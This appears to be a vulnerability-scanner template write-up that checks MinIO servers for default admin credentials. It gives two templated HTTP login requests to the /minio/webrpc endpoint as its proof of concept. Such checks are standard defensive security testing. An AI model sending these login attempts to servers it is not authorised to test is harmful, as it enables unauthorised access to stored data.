# Nuclei Template: Minio Default Login
**Template ID:** minio-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`minio-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Minio default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /minio/webrpc HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"id":1,"jsonrpc":"2.0","params":{"username":"{{username}}","password":"{{password}}"},"method":"Web.Login"}

POST /minio/webrpc HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"id":1,"jsonrpc":"2.0","params":{"username":"{{username}}","password":"{{password}}"},"method":"web.Login"}
```

## References
- https://docs.min.io/docs/minio-quickstart-guide.html#
